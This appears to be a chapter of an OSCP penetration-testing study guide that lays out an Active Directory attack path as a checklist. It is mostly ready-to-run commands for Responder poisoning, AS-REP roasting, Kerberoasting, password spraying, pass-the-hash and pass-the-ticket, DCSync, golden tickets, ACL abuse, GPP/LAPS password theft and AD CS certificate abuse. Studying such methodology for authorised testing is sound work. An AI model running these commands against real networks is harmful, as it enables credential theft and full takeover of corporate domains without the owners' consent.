# 🏛️ Phase 8 — Active Directory Attacks

> **Active Directory is the heart of most corporate networks — and ~50% of OSCP machines.**  
> This section assumes you have at least **one set of valid domain credentials** (or a foothold on a domain-joined machine).

---

## Table of Contents
- [AD Attack Path Overview](#ad-attack-path-overview)
- [Initial Foothold Without Credentials](#initial-foothold-without-credentials)
- [AS-REP Roasting](#as-rep-roasting)
- [Kerberoasting](#kerberoasting)
- [Password Spraying (AD)](#password-spraying-ad)
- [BloodHound Attack Paths](#bloodhound-attack-paths)
- [Pass-the-Hash (PtH)](#pass-the-hash-pth)
- [Pass-the-Ticket (PtT)](#pass-the-ticket-ptt)
- [DCSync Attack](#dcsync-attack)
- [ACL-Based Attacks](#acl-based-attacks)
- [LAPS & GPP Passwords](#laps--gpp-passwords)
- [AD Certificate Services (AD CS)](#ad-certificate-services-ad-cs)
- [Domain Privilege Escalation Paths](#domain-privilege-escalation-paths)

---

## AD Attack Path Overview

```
No Creds          → AS-REP Roast | Kerbrute userenum | Responder
    ↓ creds
Low-Priv Creds    → Kerberoast | BloodHound | Spray | Enum shares/GPP
    ↓
High-Value Target → PtH / PtT / DCSync / ACL abuse
    ↓
Domain Admin      → Dump NTDS.dit → All hashes → Own everything
```

---

## Initial Foothold Without Credentials

- [ ] **Identify domain from network recon**:
  ```bash
  crackmapexec smb $IP    # Shows domain name, hostname, OS
  enum4linux-ng -A $IP    # May show domain info from null session
  ```
- [ ] **Enumerate users without credentials** (Kerbrute):
  ```bash
  ./kerbrute userenum -d <domain.local> --dc $IP \
    /usr/share/seclists/Usernames/Names/names.txt
  ```
- [ ] **AS-REP Roasting** (see below — works without creds if account has pre-auth disabled)
- [ ] **LLMNR/NBT-NS Poisoning** (Responder):
  ```bash
  sudo responder -I tun0 -wrdv
  # Wait for authentication attempts → NTLMv2 hashes → crack
  ```
- [ ] **Check for anonymous / guest SMB access** → may find credentials in shares
  ```bash
  smbmap -H $IP
  smbclient -L //$IP -N
  ```
- [ ] **Check for password in LDAP description fields** (no creds needed sometimes):
  ```bash
  ldapsearch -x -H ldap://$IP -b "DC=<domain>,DC=<tld>" "(objectClass=user)" description
  ```

---

## AS-REP Roasting

**Target:** Domain users with "Do not require Kerberos preauthentication" enabled.  
**No credentials needed** to request the encrypted ticket.

- [ ] **Find vulnerable users** (requires domain user creds or check anonymously):
  ```bash
  # Impacket (from Linux — with creds)
  python3 GetNPUsers.py <domain>/<user>:<pass> -request -format hashcat -outputfile asrep_hashes.txt

  # Impacket (no creds — if null session works on LDAP)
  python3 GetNPUsers.py <domain>/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip $IP

  # PowerView (from Windows)
  Get-DomainUser -PreauthNotRequired -Properties samaccountname
  ```
- [ ] **Crack the hash**:
  ```bash
  hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
  ```

---

## Kerberoasting

**Target:** Domain accounts that have a Service Principal Name (SPN) set.  
**Requires:** Any valid domain user credentials.

- [ ] **Find Kerberoastable accounts**:
  ```bash
  # Impacket (Linux)
  python3 GetUserSPNs.py <domain>/<user>:<pass> -dc-ip $IP -request -outputfile kerb_hashes.txt

  # PowerView (Windows)
  Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname

  # Rubeus (Windows)
  .\Rubeus.exe kerberoast /outfile:hashes.txt
  ```
- [ ] **Crack the TGS hashes**:
  ```bash
  hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt
  ```

> **💡 Tip:** High-value service accounts (MSSQLSvc, HTTP, etc.) often have weak passwords because they're set once and forgotten.

---

## Password Spraying (AD)

> **⚠️ Caution:** Domain lockout policies can lock accounts. Check policy with `Get-DomainPolicy` or `net accounts /domain` first.

- [ ] **Get lockout policy first**:
  ```powershell
  net accounts /domain          # Domain password policy
  (Get-DomainPolicy)."system access"   # PowerView
  ```
- [ ] **Spray with CrackMapExec**:
  ```bash
  crackmapexec smb $IP -u users.txt -p 'Password123!' --continue-on-success
  crackmapexec ldap $IP -u users.txt -p 'Password123!' --continue-on-success
  ```
- [ ] **Spray with Kerbrute** (less noisy — uses Kerberos, not SMB):
  ```bash
  ./kerbrute passwordspray -d <domain> --dc $IP users.txt 'Password123!'
  ```
- [ ] **Common spray passwords**:
  ```
  Password1    Password123!    Welcome1    Welcome123
  <Season><Year>    Spring2024    Summer2024    Winter2024
  <Company>123    <Domain>123
  ```

---

## BloodHound Attack Paths

- [ ] **Collect data** (from Linux — most convenient):
  ```bash
  bloodhound-python -u <user> -p <pass> -d <domain> -ns $IP -c All --zip
  ```
- [ ] **Collect data** (from Windows with Rubeus/SharpHound):
  ```powershell
  .\SharpHound.exe -c All --zipfilename bloodhound.zip
  # Or:
  Import-Module SharpHound.ps1
  Invoke-BloodHound -CollectionMethod All
  ```
- [ ] **Start BloodHound**:
  ```bash
  sudo neo4j start
  bloodhound
  ```
- [ ] **Essential queries to run**:
  ```
  Find All Domain Admins
  Find Shortest Paths to Domain Admins
  Find Principals with DCSync Rights
  Find Computers where Domain Users are Local Admin
  Shortest Paths from Kerberoastable Users
  Shortest Paths from AS-REP Roastable Users
  Find Shortest Path to Domain Controller
  ```
- [ ] **Reading attack paths**:
  - Green node = owned / compromised
  - Right-click node → "Mark as Owned"
  - Yellow edges = exploitable relationships (GenericAll, WriteDACL, etc.)

---

## Pass-the-Hash (PtH)

**Requires:** NTLM hash of a domain user. No need to crack it.

- [ ] **Evil-WinRM**:
  ```bash
  evil-winrm -i $IP -u <user> -H <ntlm_hash>
  ```
- [ ] **CrackMapExec**:
  ```bash
  crackmapexec smb $IP -u <user> -H <ntlm_hash>
  crackmapexec smb $IP -u <user> -H <ntlm_hash> -x "whoami"
  ```
- [ ] **Impacket — psexec / wmiexec / smbexec**:
  ```bash
  python3 psexec.py -hashes :<ntlm_hash> <domain>/<user>@$IP
  python3 wmiexec.py -hashes :<ntlm_hash> <domain>/<user>@$IP
  python3 smbexec.py -hashes :<ntlm_hash> <domain>/<user>@$IP
  ```
- [ ] **xfreerdp (RDP)**:
  ```bash
  xfreerdp /v:$IP /u:<user> /pth:<ntlm_hash> /cert-ignore
  ```

> **⚠️ Note:** PtH doesn't work against Windows systems with Protected Users group or Credential Guard enabled.

---

## Pass-the-Ticket (PtT)

**Requires:** A Kerberos TGT or service ticket (.kirbi file).

- [ ] **Export tickets from Windows** (Mimikatz):
  ```cmd
  mimikatz.exe
  privilege::debug
  sekurlsa::tickets /export   # Exports all tickets to .kirbi files
  ```
- [ ] **Export tickets (Rubeus)**:
  ```powershell
  .\Rubeus.exe dump /nowrap   # Show tickets in base64
  .\Rubeus.exe dump /ticket:<ticket_name> /nowrap
  ```
- [ ] **Import and use ticket (Rubeus)**:
  ```powershell
  .\Rubeus.exe ptt /ticket:<base64_ticket>
  .\Rubeus.exe ptt /ticket:ticket.kirbi
  ```
- [ ] **Use ticket (Mimikatz)**:
  ```cmd
  kerberos::ptt ticket.kirbi
  klist    # Verify ticket is loaded
  ```
- [ ] **Use ticket from Linux (Impacket)**:
  ```bash
  export KRB5CCNAME=/path/to/ticket.ccache
  python3 psexec.py -k -no-pass <domain>/<user>@<target>
  ```

---

## DCSync Attack

**Requires:** `Replicating Directory Changes` permission (typically: Domain Admin, Domain Controller, or accounts with DCSync rights).

- [ ] **DCSync with Mimikatz** (on Windows):
  ```cmd
  lsadump::dcsync /domain:<domain> /user:Administrator
  lsadump::dcsync /domain:<domain> /all /csv    # Dump everything
  ```
- [ ] **DCSync with Impacket** (from Linux):
  ```bash
  python3 secretsdump.py <domain>/<user>:<pass>@$IP
  python3 secretsdump.py -hashes :<ntlm_hash> <domain>/<user>@$IP
  
  # Just domain hashes:
  python3 secretsdump.py <domain>/<user>:<pass>@$IP -just-dc-ntlm
  ```
- [ ] **After getting krbtgt hash — create Golden Ticket**:
  ```bash
  # Get domain SID first
  python3 lookupsid.py <domain>/<user>:<pass>@$IP
  
  # Create golden ticket (Mimikatz)
  kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_SID> /krbtgt:<krbtgt_hash> /ptt
  
  # Or Impacket
  python3 ticketer.py -nthash <krbtgt_hash> -domain-sid <SID> -domain <domain> Administrator
  export KRB5CCNAME=Administrator.ccache
  python3 psexec.py -k -no-pass <domain>/Administrator@<DC>
  ```

---

## ACL-Based Attacks

BloodHound will highlight these. Common exploitable ACEs:

| ACE | What it means | Attack |
|---|---|---|
| `GenericAll` | Full control over object | Reset password, add to group, DCSync |
| `GenericWrite` | Write any attribute | Set SPN → Kerberoast, set logon script |
| `WriteOwner` | Change object owner | Take ownership → GenericAll |
| `WriteDACL` | Modify ACLs | Grant yourself GenericAll |
| `ForceChangePassword` | Reset password without knowing current | Change password |
| `AddMember` | Add users to group | Add self to privileged group |
| `AllExtendedRights` | Special extended rights | Includes ForceChangePassword, DCSync |

- [ ] **Abuse GenericAll over a User** (reset password):
  ```powershell
  $pass = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
  Set-DomainUserPassword -Identity <target_user> -AccountPassword $pass
  ```
- [ ] **Abuse ForceChangePassword**:
  ```powershell
  $pass = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
  Set-DomainUserPassword -Identity <target_user> -AccountPassword $pass
  ```
- [ ] **Abuse AddMember** (add to Domain Admins):
  ```powershell
  Add-DomainGroupMember -Identity 'Domain Admins' -Members '<your_user>'
  ```
- [ ] **Abuse WriteDACL** (grant yourself DCSync rights):
  ```powershell
  $ACE = New-ADObjectAce -PrincipalIdentity '<your_user>' -Right 'ExtendedRight' -AccessControlType Allow
  # Use PowerView's Add-DomainObjectAcl:
  Add-DomainObjectAcl -TargetIdentity '<domain>' -PrincipalIdentity '<your_user>' -Rights DCSync
  ```

---

## LAPS & GPP Passwords

### LAPS (Local Administrator Password Solution)

- [ ] **Check if LAPS is installed**:
  ```powershell
  Get-Command Get-AdmPwdPassword
  # Or check for: C:\Program Files\LAPS\
  ```
- [ ] **Read LAPS passwords** (if you have rights):
  ```bash
  # Linux
  crackmapexec ldap $IP -u <user> -p <pass> -M laps
  python3 lapsreader.py -u <user> -p <pass> -d <domain> --dc-ip $IP
  
  # Windows (PowerShell)
  Get-AdmPwdPassword -ComputerName <hostname>
  ```

### GPP Passwords (Group Policy Preferences)

- [ ] **Search SYSVOL for GPP xml files**:
  ```bash
  # Linux (if SMB accessible)
  crackmapexec smb $IP -u <user> -p <pass> -M gpp_password
  
  # Manual search
  smbclient //$IP/SYSVOL -U <user>
  # find all Groups.xml, Services.xml, ScheduledTasks.xml, Datasources.xml
  ```
- [ ] **Decrypt cpassword** (GPP uses AES with known key):
  ```bash
  gpp-decrypt '<cpassword_value>'
  ```

---

## AD Certificate Services (AD CS)

- [ ] **Check if AD CS is present**:
  ```bash
  crackmapexec ldap $IP -u <user> -p <pass> -M adcs
  ```
- [ ] **Certipy — enumerate vulnerable templates**:
  ```bash
  pip3 install certipy-ad
  certipy find -u <user>@<domain> -p <pass> -dc-ip $IP -vulnerable
  ```
- [ ] **ESC1** — Client can specify SAN (Subject Alternative Name):
  ```bash
  certipy req -u <user>@<domain> -p <pass> -ca '<CA_name>' \
    -template '<vulnerable_template>' -upn administrator@<domain>
  certipy auth -pfx administrator.pfx -dc-ip $IP
  # Returns NT hash of Administrator
  ```

---

## Domain Privilege Escalation Paths

Quick reference: common escalation routes in AD environments:

```
Low-Priv Domain User
    │
    ├─ Kerberoastable service account → crack TGS → new creds
    │
    ├─ AS-REP roastable user → crack AS-REP hash → creds
    │
    ├─ User with GenericAll over another user → reset password
    │
    ├─ User is local admin on a machine → dump SAM → pass hashes
    │
    ├─ User can add members to privileged group
    │
    └─ BloodHound shortest path → follow the path
           ↓
    Domain Admin
           ↓
    DCSync → krbtgt hash → Golden Ticket → Persistence
```

---

## 🔗 References

- [HackTricks — Active Directory](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [BloodHound GitHub](https://github.com/BloodHoundAD/BloodHound)
- [Impacket GitHub](https://github.com/fortra/impacket)
- [Certipy — AD CS Abuse](https://github.com/ly4k/Certipy)
- [The Hacker Recipes — AD](https://www.thehacker.recipes/ad/)
- [adsecurity.org](https://adsecurity.org/)

---

*[← Database PrivEsc](../07_privilege_escalation/03_database_privesc.md) · [Back to Main](../README.md) · [Lateral Movement →](../09_lateral_movement/README.md)*
